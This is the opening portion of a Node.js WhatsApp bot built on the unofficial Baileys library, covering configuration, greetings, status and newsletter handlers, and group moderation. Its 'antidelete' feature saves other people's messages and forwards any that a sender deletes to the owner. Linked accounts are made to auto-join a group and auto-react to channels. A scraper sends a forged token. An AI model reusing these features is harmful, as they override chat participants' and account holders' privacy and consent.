const express = require('express');
const fs = require('fs-extra');
const path = require('path');

// MODE BOT
global.botMode = 'public';
const os = require('os');
const { exec } = require('child_process');
const router = express.Router();
const pino = require('pino');
const moment = require('moment-timezone');
const yts = require('yt-search');
const Jimp = require('jimp');
const crypto = require('crypto');
const axios = require('axios');
const FileType = require('file-type');
const fetch = require('node-fetch');
// MongoDB ranplase ak local_db.js
const { initMongo, saveCredsToMongo, loadCredsFromMongo, removeSessionFromMongo, addNumberToMongo, removeNumberFromMongo, getAllNumbersFromMongo, loadAdminsFromMongo, addAdminToMongo, removeAdminFromMongo, addNewsletterToMongo, removeNewsletterFromMongo, listNewslettersFromMongo, saveNewsletterReaction, addNewsletterReactConfig, removeNewsletterReactConfig, listNewsletterReactsFromMongo, getReactConfigForJid, loadUserConfigFromMongo, getRestartSchedule, setRestartSchedule, stopRestartSchedule, ensureStatusInfractionsIndex, getStatusInfractionDoc, incrStatusInfraction, resetStatusInfraction, setStatusInfractionCount, upsertServerStatus, listServerStatuses, getNumbersForServer, setUserConfigInMongo: _setUserConfigInMongoRaw } = require("./mongo_db");
const { loadPlugins } = require('./pluginLoader');
const plugins = loadPlugins();
const { sms, downloadMediaMessage } = require('./msg')
const { createStickerFromMedia, sendSticker } = require('./s-utils');
const { getGroupAdminsInfo, jidToNumber } = require('./normalize');
const { uploadFile: uploadCloudku } = require("cloudku-uploader");
const FormData = require("form-data");
// dans ton switch principal
const { groupStatus, buildStatusContent } = require('./status');
const { handleAntiLink } = require('./antilink');
const { toggleAntiLink, isAntiLinkEnabled } = require('./antilink');
const cheerio = require('cheerio');
const CryptoJS = require('crypto-js');
const {
  toggleWelcome,
  toggleGoodbye,
  isWelcomeEnabled,
  isGoodbyeEnabled,
  setWelcomeTemplate,
  setGoodbyeTemplate,
  handleParticipantUpdate
} = require('./welcome_goodbye');
const translate = require('google-translate-api');

// ── CACHE KONFIGIRASYON (evite rekèt MongoDB repetitif chak mesaj) ──
const sessionConfigCache = new Map(); // sessionId -> { config, ts }
const CONFIG_CACHE_TTL_MS = 30000; // 30 segond

async function loadSessionConfigMerged(sessionId) {
  const cached = sessionConfigCache.get(sessionId);
  if (cached && (Date.now() - cached.ts) < CONFIG_CACHE_TTL_MS) {
    return cached.config;
  }
  try {
    const saved = await loadUserConfigFromMongo(sessionId);
    const merged = { ...DEFAULT_SESSION_CONFIG, ...(saved || {}) };
    sessionConfigCache.set(sessionId, { config: merged, ts: Date.now() });
    return merged;
  } catch (e) {
    console.error('[loadSessionConfigMerged] error:', e.message);
    return cached ? cached.config : { ...DEFAULT_SESSION_CONFIG };
  }
}

// Wrapper: chak fwa konfigirasyon SAUVEGARDE, mete ajou cache a IMEDYATMAN
// pou chanjman an aplike san atann 30s la ekspire.
async function setUserConfigInMongo(sessionId, cfg) {
  await _setUserConfigInMongoRaw(sessionId, cfg);
  sessionConfigCache.set(sessionId, {
    config: { ...DEFAULT_SESSION_CONFIG, ...cfg },
    ts: Date.now()
  });
}

// ── GREETING — Une seule fois par utilisateur, persistant même après redémarrage ──
const _fs   = require('fs');
const _path = require('path');
const SEEN_USERS_FILE = _path.join(__dirname, 'seen_users.json');
const GREETING_BOT_IMAGE = 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg';

// Charger la liste depuis le fichier JSON
function loadSeenUsers() {
  try {
    if (_fs.existsSync(SEEN_USERS_FILE))
      return new Set(JSON.parse(_fs.readFileSync(SEEN_USERS_FILE, 'utf8')));
  } catch (e) {}
  return new Set();
}

// Sauvegarder immédiatement dans le fichier
function markUserSeen(jid) {
  try {
    const set = loadSeenUsers();    // relit depuis disque -> multi-session safe
    if (set.has(jid)) return false; // déjà vu dans n'importe quelle session
    set.add(jid);
    _fs.writeFileSync(SEEN_USERS_FILE, JSON.stringify([...set]), 'utf8');
    return true; // nouveau
  } catch (e) {
    return false;
  }
}

function buildGreetingMessage(userName, botName) {
  return [
    '*╭───────────◇*',
    '│ ✧ 👋 ʙɪᴇɴᴠᴇɴᴜᴇ !',
    '│ ✧ ʙᴏɴᴊᴏᴜʀ @' + userName + ' ! 😊',
    '│ ✧ ʙɪᴇɴᴠᴇɴᴜ sᴜʀ *' + botName + '* !',
    '',
    '━━━━━━━━━━━━━━━━━━━━━━━',
    '📌 *Commandes rapides :*',
    '  ╰ *.menu* — Voir toutes les commandes',
    '  ╰ *.help* — Obtenir de l\'aide',
    '  ╰ *.ping* — Tester le bot',
    '━━━━━━━━━━━━━━━━━━━━━━━',
    '',
    '✨ Tapez une commande pour commencer !',
    '',
    '> *' + botName + '* 🇭🇹'
  ].join('\n');
}

async function handleGreeting(socket, msg, botName) {
  try {
    const from = msg && msg.key && msg.key.remoteJid ? msg.key.remoteJid : '';

    // Ignorer : groupes, broadcast, messages du bot lui-même
    if (!from || from.endsWith('@g.us') || from === 'status@broadcast') return;
    if (msg && msg.key && msg.key.fromMe) return;

    // Vérifier dans le fichier (commun à toutes les sessions)
    // markUserSeen retourne true seulement si c'est vraiment la première fois
    const isNew = markUserSeen(from);
    if (!isNew) return;

    const userName  = from.split('@')[0];
    const useBotName = botName || 'Doberto XD';

    let profilePic = GREETING_BOT_IMAGE;
    try {
      profilePic = await socket.profilePictureUrl(from, 'image') || GREETING_BOT_IMAGE;
    } catch (e) {}

    await socket.sendMessage(from, {
      image: { url: profilePic },
      caption: buildGreetingMessage(userName, useBotName),
      mentions: [from]
    });

    console.log('[GREETING] Bienvenue envoyé à ' + from);
  } catch (err) {
    console.error('[GREETING ERREUR]', err && err.message ? err.message : err);
  }
}
// FIN GREETING
const {
  default: makeWASocket,
  useMultiFileAuthState,
  delay,
  getContentType,
  makeCacheableSignalKeyStore,
  Browsers,
  downloadContentFromMessage,
  DisconnectReason
} = require('@whiskeysockets/baileys');
const { jidNormalizedUser } = require('baileys')
// Au début de ton fichier, après les imports
if (!global.scheduledRestart) {
    global.scheduledRestart = null;
}
// Variable globale pour stocker la dernière traduction
let lastTranslationText = "";

// Optionnel: Sauvegarder l'état au redémarrage
process.on('exit', () => {
    if (global.scheduledRestart?.timer) {
        console.log('⏰ Schedule restart arrêté (process exit)');
    }
});
// ---------------- CONFIG ----------------

// main.js (ou handlers.js)
const BOT_NAME_FANCY = 'Doberto XD x Community';


  // en haut de mongo_utils.js (ou ton helper)
const DEFAULT_SESSION_CONFIG = {
  AUTO_VIEW_STATUS: true,
  AUTO_LIKE_STATUS: true,
  AUTO_RECORDING: false,
  AUTO_LIKE_EMOJI: ['🐉','🔥','💀','👑','💪','😎','🇭🇹','⚡','🩸','❤️'],
  PREFIX: '.',
  AUTO_ONLINE: false,
  ANTI_TAG_MODE: true
};
const config = {
  MAX_RETRIES: 3,
  GROUP_INVITE_LINK: 'https://chat.whatsapp.com/Jhfto4qTh6GAEjBOvPyA2w?s=cl&p=a&mlu=3',
  RCD_IMAGE_PATH: 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg',
  NEWSLETTER_JIDS: [
  '120363407485857714@newsletter',
  '120363423792937578@newsletter',
  '120363408699213231@newsletter',
  '120363405168740969@newsletter'
],
  OTP_EXPIRY: 300000,
  OWNER_NUMBER: process.env.OWNER_NUMBER || '50935878442',
  // Lis tout nimewo ki gen dwa "owner" (separe ak virgil nan env OWNER_NUMBERS).
  OWNER_NUMBERS: (process.env.OWNER_NUMBERS || '50935878442,50939492644')
    .split(',')
    .map(n => n.trim().replace(/[^0-9]/g, ''))
    .filter(Boolean),
  PREMIUM:'00000000000@s.whatsapp.net',
  CHANNEL_LINKS: [
  'https://whatsapp.com/channel/0029VbBulmY0LKZLRooVdU0i',
  'https://whatsapp.com/channel/0029VbCRDyv0AgWL847SQ419',
  'https://whatsapp.com/channel/0029VbCWFfs4o7qNqouHPH1O',
  'https://whatsapp.com/channel/0029VbC8nfUCxoAqtsmoHv1s'
],
  BOT_NAME: 'Doberto-XD',
  BOT_VERSION: '2.1.0',
  OWNER_NAME: 'Dev Doberto',
  IMAGE_PATH: 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg',
  BOT_FOOTER: '> Powered by Doberto XD',
  BUTTON_IMAGES: { ALIVE: '' }
};


// ---------------- MONGO SETUP ----------------


// ---------------- basic utils ----------------

function formatMessage(title, content, footer) {
  return `*${title}*\n\n${content}\n\n> *${footer}*`;
}
function generateOTP(){ return Math.floor(100000 + Math.random() * 900000).toString(); }
function getHaitiTimestamp() { 
  return moment().tz('America/Port-au-Prince').format('dddd D MMMM YYYY, HH:mm:ss');
}

// Résultat : "lundi 27 janvier 2025, 15:30:45"
const activeSockets = new Map();

// ============================================================
// HEARTBEAT MILTISÈVÈ — rapòte chaj sèvè sa a bay MongoDB
// pou paj "Choose a Server" la ka montre disponiblite an tan reyèl
// ============================================================
const SERVER_ID = process.env.SERVER_ID || 'server-1';
const SERVER_URL = process.env.SERVER_URL || `http://localhost:${process.env.PORT || 2015}`;
const MAX_SESSIONS = parseInt(process.env.MAX_SESSIONS || '50', 10);

async function reportServerHeartbeat() {
  try {
    await upsertServerStatus(SERVER_ID, {
      url: SERVER_URL,
      activeSessions: activeSockets.size,
      maxSessions: MAX_SESSIONS
    });
  } catch (e) {
    console.error('[Heartbeat] Echèk rapò sèvè:', e.message);
  }
}
setInterval(reportServerHeartbeat, 15000);
setTimeout(reportServerHeartbeat, 5000);

// ============================================================
// ANTIBOT — Silanse lòt bot nan group yo
// ============================================================
global.antibotGroups = new Set(); // groupes où antibot est actif

const socketCreationTime = new Map();

// Anpeche 2 tantativ rekoneksyon fèt anmenmtan pou menm nimewo a
// (sa te lakòz kòmand yo reponn 2 fwa lè 2 socket te vivan anmenmtan)
const reconnectingNumbers = new Set();

const otpStore = new Map();
// ============================================================
// ANTIDELETE STORE — Store en mémoire par session
// ============================================================
const messageStores = new Map(); // sessionNumber → Map<msgId, msgObject>

const STORE_MAX_PER_SESSION = 500;  // quota max par session
const STORE_CLEAN_INTERVAL  = 20 * 60 * 1000; // nettoyage toutes les 20 min

function getSessionStore(sessionNumber) {
  if (!messageStores.has(sessionNumber)) {
    messageStores.set(sessionNumber, new Map());
  }
  return messageStores.get(sessionNumber);
}

function storeMessage(sessionNumber, msg) {
  if (!msg?.key?.id || !msg?.message) return;
  const store = getSessionStore(sessionNumber);

  // Quota dépassé → vider les 100 plus anciens
  if (store.size >= STORE_MAX_PER_SESSION) {
    const keys = [...store.keys()].slice(0, 100);
    keys.forEach(k => store.delete(k));
  }

  store.set(msg.key.id, msg);
}

function getStoredMessage(sessionNumber, msgId) {
  return getSessionStore(sessionNumber).get(msgId) || null;
}

// Nettoyage automatique toutes les 20 min
setInterval(() => {
  for (const [sessionNumber, store] of messageStores.entries()) {
    store.clear();
    console.log(`[ANTIDELETE] Store nettoyé pour session ${sessionNumber}`);
  }
}, STORE_CLEAN_INTERVAL);

// ---------------- helpers kept/adapted ----------------

async function joinGroup(socket) {
  let retries = config.MAX_RETRIES;
  const inviteCodeMatch = (config.GROUP_INVITE_LINK || '').match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
  if (!inviteCodeMatch) return { status: 'failed', error: 'No group invite configured' };
  const inviteCode = inviteCodeMatch[1];
  while (retries > 0) {
    try {
      const response = await socket.groupAcceptInvite(inviteCode);
      if (response?.gid) return { status: 'success', gid: response.gid };
      throw new Error('No group ID in response');
    } catch (error) {
      retries--;
      let errorMessage = error.message || 'Unknown error';
      if (error.message && error.message.includes('not-authorized')) errorMessage = 'Bot not authorized';
      else if (error.message && error.message.includes('conflict')) errorMessage = 'Already a member';
      else if (error.message && error.message.includes('gone')) errorMessage = 'Invite invalid/expired';
      if (retries === 0) return { status: 'failed', error: errorMessage };
      await delay(2000 * (config.MAX_RETRIES - retries));
    }
  }
  return { status: 'failed', error: 'Max retries reached' };
}

async function sendAdminConnectMessage(socket, number, groupResult, sessionConfig = {}) {
  const admins = await loadAdminsFromMongo();
  const groupStatus = groupResult.status === 'success' ? `Joined (ID: ${groupResult.gid})` : `Failed to join group: ${groupResult.error}`;
  const botName = sessionConfig.botName || BOT_NAME_FANCY;
  const image = sessionConfig.logo || config.RCD_IMAGE_PATH;
  const caption = formatMessage(botName, `📞 Number: ${number}\n🩵 Statut: ${groupStatus}\n🕒 Connecté a: ${getHaitiTimestamp()}`, botName);
  for (const admin of admins) {
    try {
      const to = admin.includes('@') ? admin : `${admin}@s.whatsapp.net`;
      if (String(image).startsWith('http')) {
        await socket.sendMessage(to, { image: { url: image }, caption });
      } else {
        try {
          const buf = fs.readFileSync(image);
          await socket.sendMessage(to, { image: buf, caption });
        } catch (e) {
          await socket.sendMessage(to, { image: { url: config.RCD_IMAGE_PATH }, caption });
        }
      }
    } catch (err) {
      console.error('Failed to send connect message to admin', admin, err?.message || err);
    }
  }
}

async function sendOwnerConnectMessage(socket, number, groupResult, sessionConfig = {}) {
  try {
    const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}@s.whatsapp.net`;
    const activeCount = activeSockets.size;
    const botName = sessionConfig.botName || BOT_NAME_FANCY;
    const image = sessionConfig.logo || config.RCD_IMAGE_PATH;

    const groupStatus = groupResult.status === 'success' 
      ? `✅ Rejoint (ID: ${groupResult.gid})` 
      : `❌ Échec: ${groupResult.error}`;
    
    // Message très simple et clair
    const caption = `👑 NOTIFICATION PROPRIÉTAIRE 👑

🤖 Bot: ${botName}
📱 Numéro: ${number}
🩵 Statut: ${groupStatus}
🕒 Connecté: ${getHaitiTimestamp()}
👥 Sessions: ${activeCount}

📍 Fuseau: Haïti
📊 Performance: ${activeCount > 5 ? "Élevée" : "Normale"}

━━━━━━━━━━━━━━━━━━

⚠️ Notification automatique
${new Date().toLocaleString('fr-FR', { 
  timeZone: 'America/Port-au-Prince',
  dateStyle: 'medium',
  timeStyle: 'short'
})}`;

    if (String(image).startsWith('http')) {
      await socket.sendMessage(ownerJid, { 
        image: { url: image }, 
        caption: caption
      });
    } else {
      try {
        const buf = fs.readFileSync(image);
        await socket.sendMessage(ownerJid, { 
          image: buf, 
          caption: caption
        });
      } catch (e) {
        await socket.sendMessage(ownerJid, { 
          image: { url: config.RCD_IMAGE_PATH }, 
          caption: caption
        });
      }
    }
    
    console.log(`✅ Notification propriétaire envoyée (${activeCount} sessions)`);
    
  } catch (err) { 
    console.error('❌ Échec notification propriétaire:', err.message || err); 
  }
}
async function sendOTP(socket, number, otp) {
  const userJid = jidNormalizedUser(socket.user.id);
  const message = formatMessage(`🔐 OTP VERIFICATION — ${BOT_NAME_FANCY}`, `Your OTP for config update is: *${otp}*\nThis OTP will expire in 5 minutes.\n\nNumber: ${number}`, BOT_NAME_FANCY);
  try { await socket.sendMessage(userJid, { text: message }); console.log(`OTP ${otp} sent to ${number}`); }
  catch (error) { console.error(`Failed to send OTP to ${number}:`, error); throw error; }
}

// ---------------- handlers (newsletter + reactions) ----------------

async function setupNewsletterHandlers(socket, sessionNumber) {
  const rrPointers = new Map();

  socket.ev.on('messages.upsert', async ({ messages }) => {
    const message = messages[0];
    if (!message?.key) return;
    const jid = message.key.remoteJid;

    try {
      const followedDocs = await listNewslettersFromMongo(); // array of {jid, emojis}
      const reactConfigs = await listNewsletterReactsFromMongo(); // [{jid, emojis}]
      const reactMap = new Map();
      for (const r of reactConfigs) reactMap.set(r.jid, r.emojis || []);

      const followedJids = followedDocs.map(d => d.jid);
      if (!followedJids.includes(jid) && !reactMap.has(jid)) return;

      let emojis = reactMap.get(jid) || null;
      if ((!emojis || emojis.length === 0) && followedDocs.find(d => d.jid === jid)) {
        emojis = (followedDocs.find(d => d.jid === jid).emojis || []);
      }
      if (!emojis || emojis.length === 0) emojis = config.AUTO_LIKE_EMOJI;

      let idx = rrPointers.get(jid) || 0;
      const emoji = emojis[idx % emojis.length];
      rrPointers.set(jid, (idx + 1) % emojis.length);

      const messageId = message.newsletterServerId || message.key.id;
      if (!messageId) return;

      let retries = 3;
      while (retries-- > 0) {
        try {
          if (typeof socket.newsletterReactMessage === 'function') {
            await socket.newsletterReactMessage(jid, messageId.toString(), emoji);
          } else {
            await socket.sendMessage(jid, { react: { text: emoji, key: message.key } });
          }
          console.log(`Reacted to ${jid} ${messageId} with ${emoji}`);
          await saveNewsletterReaction(jid, messageId.toString(), emoji, sessionNumber || null);
          break;
        } catch (err) {
          console.warn(`Reaction attempt failed (${3 - retries}/3):`, err?.message || err);
          await delay(1200);
        }
      }

    } catch (error) {
      console.error('Newsletter reaction handler error:', error?.message || error);
    }
  });
}

// Assure-toi d'avoir importé ton helper en haut du fichier
// const { handleParticipantUpdate } = require('./welcome_goodbye');

/**
 * Enregistre les listeners liés aux participants de groupe.
 * Appelle cette fonction une seule fois après l'initialisation du socket.
 * @param {import('baileys').AnySocket} socket
 */
async function registerGroupParticipantListener(socket) {
  // on attache l'événement une seule fois
  socket.ev.on('group-participants.update', async (update) => {
    try {
      if (!update) return;

      // Compatibilité selon versions : id ou groupId
      const from = update.id || update?.groupId || null;
      if (!from) {
        console.warn('GROUP PARTICIPANTS UPDATE: missing group id', update);
        return;
      }

      // Normaliser participants (Baileys peut renvoyer participants ou participant)
      const participants = Array.isArray(update.participants)
        ? update.participants
        : (update.participant ? [update.participant] : []);

      if (!participants.length) return;

      // Log utile pour debug
      console.log('GROUP PARTICIPANTS UPDATE -> group:', from, 'action:', update.action, 'participants:', participants);

      // Appel du handler centralisé (welcome_goodbye.js)
      await handleParticipantUpdate(socket, from, update);

    } catch (e) {
      console.error('GROUP PARTICIPANTS UPDATE ERROR', e);
    }
  });
}
// ---------------- status + revocation + resizing ----------------

async function setupStatusHandlers(socket, sanitizedNumber) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const message = messages[0];
    if (!message?.key || message.key.remoteJid !== 'status@broadcast' || !message.key.participant) return;

    // UTILISER sanitizedNumber (déjà nettoyé) ; fallback minimal si absent
    const sessionId = (sanitizedNumber && String(sanitizedNumber).replace(/[^0-9]/g,''))
      || (socket?.authState?.creds?.me?.id || socket?.user?.id || message.key.participant || message.key.remoteJid || '')
           .split('@')[0].replace(/[^0-9]/g,'');

    console.log('[HANDLER] status event remoteJid:', message.key.remoteJid, 'participant:', message.key.participant);
    console.log('[HANDLER] using sessionId:', sessionId);

    if (!sessionId) {
      console.warn('[HANDLER] No sessionId available for status handler; skipping session-specific config');
      return;
    }

    const cfg = await loadSessionConfigMerged(sessionId);
    console.log('[HANDLER] merged cfg for', sessionId, cfg);

    try {
      if (cfg.AUTO_ONLINE) {
        console.log('[HANDLER] AUTO_ONLINE -> sending available presence');
        await socket.sendPresenceUpdate('available', message.key.remoteJid);
        setTimeout(async () => {
          try { await socket.sendPresenceUpdate('unavailable', message.key.remoteJid); }
          catch (e) { console.warn('[HANDLER] presence revert failed', e); }
        }, 5000);
      }

      if (cfg.AUTO_RECORDING) {
        await socket.sendPresenceUpdate('recording', message.key.remoteJid);
      }

      if (cfg.AUTO_VIEW_STATUS) {
        let retries = config.MAX_RETRIES;
        while (retries > 0) {
          try { await socket.readMessages([message.key]); break; }
          catch (error) { retries--; await delay(1000 * (config.MAX_RETRIES - retries)); if (retries === 0) throw error; }
        }
      }

      if (cfg.AUTO_LIKE_STATUS) {
        const emojis = Array.isArray(cfg.AUTO_LIKE_EMOJI) && cfg.AUTO_LIKE_EMOJI.length ? cfg.AUTO_LIKE_EMOJI : config.AUTO_LIKE_EMOJI;
        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
        let retries = config.MAX_RETRIES;
        while (retries > 0) {
          try {
            await socket.sendMessage(
              message.key.remoteJid,
              { react: { text: randomEmoji, key: message.key } },
              { statusJidList: [message.key.participant] }
            );
            break;
          } catch (error) {
            retries--;
            await delay(1000 * (config.MAX_RETRIES - retries));
            if (retries === 0) throw error;
          }
        }
      }

    } catch (error) {
      console.error('Status handler error:', error);
    }
  });
}
// downloader robuste
async function robustDownload(messageObj, downloader) {
  // messageObj peut être quoted, quoted.viewOnceMessage, imageMessage, etc.
  if (!messageObj) throw new Error('No message object provided to downloader');

  // extraire inner message si viewOnce
  const innerFromViewOnce = messageObj.viewOnceMessage?.message || messageObj;
  // trouver le type présent
  const qTypes = ['imageMessage','videoMessage','documentMessage','stickerMessage','audioMessage'];
  let inner = null;
  for (const t of qTypes) {
    if (innerFromViewOnce[t]) { inner = innerFromViewOnce[t]; break; }
  }
  // si aucun type trouvé, peut-être que messageObj est déjà le content
  if (!inner) {
    // essayer d'utiliser messageObj.imageMessage etc.
    for (const t of qTypes) {
      if (messageObj[t]) { inner = messageObj[t]; break; }
    }
  }
  if (!inner) inner = innerFromViewOnce;

  // déterminer le type pour downloadContentFromMessage
  let type = 'image';
  if (inner.videoMessage) type = 'video';
  else if (inner.documentMessage) type = 'document';
  else if (inner.audioMessage) type = 'audio';
  else if (inner.stickerMessage) type = 'sticker';
  else if (inner.imageMessage) type = 'image';

  // downloader peut être une fonction qui renvoie Buffer ou un stream async iterable
  if (typeof downloader !== 'function') throw new Error('Downloader function required');

  const streamOrBuffer = await downloader(inner, type);
  if (!streamOrBuffer) throw new Error('Downloader returned empty');

  if (Buffer.isBuffer(streamOrBuffer)) return streamOrBuffer;

  // sinon concaténer le stream async iterable
  const chunks = [];
  for await (const chunk of streamOrBuffer) chunks.push(chunk);
  const buffer = Buffer.concat(chunks);
  if (!buffer || buffer.length === 0) throw new Error('Buffer vide après téléchargement');
  return buffer;
}
async function handleMessageRevocation(socket, number) {
  const sanitized = String(number || '').replace(/[^0-9]/g, '');
  const ownerJid  = `${sanitized}@s.whatsapp.net`;

  // ── Listener 1 : messages.delete ──
  socket.ev.on('messages.delete', async ({ keys }) => {
    if (!keys?.length) return;
    for (const key of keys) {
      try {
        await processRevoke(sanitized, ownerJid, socket, key.id, key.remoteJid, key.participant);
      } catch(e) { console.error('[AD messages.delete]', e); }
    }
  });

  // ── Listener 2 : protocolMessage REVOKE ──
  socket.ev.on('messages.upsert', async ({ messages }) => {
    for (const m of messages) {
      try {
        if (m?.message?.protocolMessage?.type !== 0) continue;
        const revokedKey = m.message.protocolMessage.key;
        if (!revokedKey?.id) continue;
        await processRevoke(
          sanitized, ownerJid, socket,
          revokedKey.id,
          revokedKey.remoteJid || m.key.remoteJid,
          revokedKey.participant || m.key.participant
        );
      } catch(e) { console.error('[AD REVOKE upsert]', e); }
    }
  });
}

// ── Fonction centrale de traitement ──
async function processRevoke(sanitized, ownerJid, socket, msgId, chatId, participant) {

  const cfg = await loadUserConfigFromMongo(sanitized) || {};
  if (!cfg.antidelete || cfg.antidelete === 'off') return;

  const mode      = cfg.antidelete;
  const isGroup   = (chatId || '').endsWith('@g.us');
  const isPrivate = (chatId || '').endsWith('@s.whatsapp.net');

  if (mode === 'g' && !isGroup)   return;
  if (mode === 'p' && !isPrivate) return;

  const deletedMsg = getStoredMessage(sanitized, msgId);
  if (!deletedMsg) {
    console.warn(`[ANTIDELETE][${sanitized}] ${msgId} absent du store`);
    return;
  }

  const senderNum    = (participant || chatId || '').split('@')[0];
  const deletionTime = getHaitiTimestamp();
  const context      = isGroup
    ? `👥 *Groupe :* ${chatId}\n`
    : `💬 *Privé :* +${senderNum}\n`;

  // ── Notification ──
  await socket.sendMessage(ownerJid, {
    text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
          `┃  🗑️ *ANTIDELETE*\n` +
          `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
          `👤 *Auteur :* @${senderNum}\n` +
          `${context}` +
          `⏰ *Heure  :* ${deletionTime}\n` +
          `━━━━━━━━━━━━━━━━━━`,
    mentions: [participant || chatId]
  });

  // ── Contenu ──
  const m = deletedMsg.message;
  if (!m) return;

  const internalTypes = [
    'protocolMessage', 'reactionMessage', 'pollUpdateMessage',
    'senderKeyDistributionMessage', 'messageContextInfo'
  ];

  const contentType = Object.keys(m).find(t => !internalTypes.includes(t));
  if (!contentType) return;

  // ── Texte ──
  if (contentType === 'conversation' || contentType === 'extendedTextMessage') {
    const text = m.conversation || m.extendedTextMessage?.text || '';
    if (text) {
      await socket.sendMessage(ownerJid, {
        text: `💬 *Contenu supprimé :*\n\n${text}`
      });
    }

  // ── Médias → forward direct ──
  } else if ([
    'imageMessage', 'videoMessage', 'audioMessage',
    'documentMessage', 'stickerMessage', 'gifMessage', 'ptvMessage'
  ].includes(contentType)) {
    try {
      await socket.sendMessage(ownerJid, {
        forward: deletedMsg,
        force: true
      });
    } catch(fwdErr) {
      console.error('[ANTIDELETE] forward échoué:', fwdErr.message);
      await socket.sendMessage(ownerJid, {
        text: `📎 *Média supprimé* _(${contentType.replace('Message', '')})_\n_Impossible de retransférer_`
      });
    }

  } else {
    console.log(`[ANTIDELETE][${sanitized}] type ignoré: ${contentType}`);
  }

  getSessionStore(sanitized).delete(msgId);
}
function generateTS() { return Math.floor(Date.now() / 1000); }
function generateTT(ts) { return CryptoJS.MD5(String(ts) + 'X-Fc-Pp-Ty-eZ').toString(); }

async function reelsvideo(url) {
  const ts = generateTS();
  const tt = generateTT(ts);

  const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'hx-request': 'true',
    'hx-current-url': 'https://reelsvideo.io/',
    'hx-target': 'target',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://reelsvideo.io',
    'Referer': 'https://reelsvideo.io/'
  };

  const body = new URLSearchParams();
  body.append('id', url);
  body.append('locale', 'en');
  body.append('cf-turnstile-response', '');
  body.append('tt', tt);
  body.append('ts', ts);

  // NOTE: utiliser l'endpoint générique ; certains sites exigent l'URL exacte.
  const res = await axios.post('https://reelsvideo.io/reel/', body, { headers });

  const $ = cheerio.load(res.data);

  const username = $('.bg-white span.text-400-16-18').first().text().trim() || null;
  const thumb = $('div[data-bg]').first().attr('data-bg') || null;

  const videos = [];
  $('a.type_videos').each((i, el) => {
    const href = $(el).attr('href');
    if (href) videos.push(href);
  });

  const images = [];
  $('a.type_images').each((i, el) => {
    const href = $(el).attr('href');
    if (href) images.push(href);
  });

  const mp3 = [];
  $('a.type_audio').each((i, el) => {
    const href = $(el).attr('href');
    const id = $(el).attr('data-id');
    if (href && id) mp3.push({ id, url: href });
  });

  let type = 'unknown';
  if (videos.length && images.length) type = 'carousel';
  else if (videos.length) type = 'video';
  else if (images.length) type = 'photo';

  return { type, username, thumb, videos, images, mp3 };
}



function handleGroupStatusMention(socket, sessionId) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    try {
      if (!messages || !messages.length) return;
      const m = messages[0];
      if (!m || !m.message || !m.key) return;

      const remote = m.key.remoteJid || '';
      // Vérifier que c'est bien un groupe
      if (!remote.endsWith('@g.us')) return;

      // Charger la config de la session
      const cfg = await loadUserConfigFromMongo(sessionId) || {};
      if (!cfg.antistatusmention) return; // mode désactivé

      // Détecter le type du message
      const keys = Object.keys(m.message);
      const type = keys.length ? keys[0] : 'unknown';

      // Si c'est une mention de statut de groupe
      if (type === 'groupStatusMentionMessage') {
        const groupId = remote;
        const participant = m.key.participant || m.key.from || null;
        const participantNum = participant ? participant.split('@')[0] : 'inconnu';

        // Supprimer le message
        try {
          await socket.sendMessage(groupId, { delete: m.key });
        } catch (e) {
          console.warn('[ANTISTATUS] suppression échouée', e?.message || e);
        }

        // Avertir publiquement l’expéditeur
        try {
          await socket.sendMessage(groupId, {
            text: `⚠️ @${participantNum}, les mentions de statut sont interdites dans ce groupe. Répète et tu seras expulsé.`,
            mentions: participant ? [participant] : []
          });
        } catch (e) {
          console.warn('[ANTISTATUS] avertissement échoué', e?.message || e);
        }

        // Incrémenter le compteur d’infractions en Mongo
        let count = 1;
        try {
          count = await incrStatusInfraction(sessionId, groupId, participant);
        } catch (e) {
          console.error('[ANTISTATUS] erreur incrStatusInfraction', e);
        }

        // Seuil configurable (par défaut 2)
        const THRESHOLD = (cfg.antistatusmention_threshold && Number(cfg.antistatusmention_threshold)) || 2;

        // Si récidive >= seuil => expulsion
        if (count >= THRESHOLD) {
          try { await resetStatusInfraction(sessionId, groupId, participant); } catch(e){}

          let groupMeta = null;
          try {
            groupMeta = await socket.groupMetadata(groupId);
          } catch (e) {
            console.warn('[ANTISTATUS] impossible de récupérer groupMetadata', e?.message || e);
          }

          // Vérifier si participant est admin
          const isParticipantAdmin = groupMeta?.participants?.some(p => p.id === participant && (p.admin === 'admin' || p.admin === 'superadmin'));
          if (isParticipantAdmin) {
            await socket.sendMessage(groupId, {
              text: `⚠️ @${participantNum} a atteint le seuil d'infractions mais est administrateur, impossible de l'expulser.`,
              mentions: [participant]
            });
            return;
          }

          // Vérifier si le bot est admin
          const botJid = socket.user?.id || socket.user?.jid || null;
          const isBotAdmin = groupMeta?.participants?.some(p => p.id === botJid && (p.admin === 'admin' || p.admin === 'superadmin'));
          if (!isBotAdmin) {
            await socket.sendMessage(groupId, {
              text: `⚠️ Le bot n'est pas administrateur, impossible d'expulser @${participantNum}.`,
              mentions: [participant]
            });
            return;
          }

          // Expulser
          try {
            await socket.groupParticipantsUpdate(groupId, [participant], 'remove');
            await socket.sendMessage(groupId, {
              text: `🚫 @${participantNum} a été expulsé pour récidive (mentions de statut).`,
              mentions: [participant]
            });
          } catch (e) {
            console.error('[ANTISTATUS] erreur expulsion', e);
            await socket.sendMessage(groupId, {
              text: `⚠️ Impossible d'expulser @${participantNum}.`,
              mentions: [participant]
            });
          }
        }
      }
    } catch (err) {
      console.error('[ANTISTATUS HANDLER ERROR]', err);
    }
  });
}
// ---------------- command handlers ----------------
function setupCommandHandlers(socket, number) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
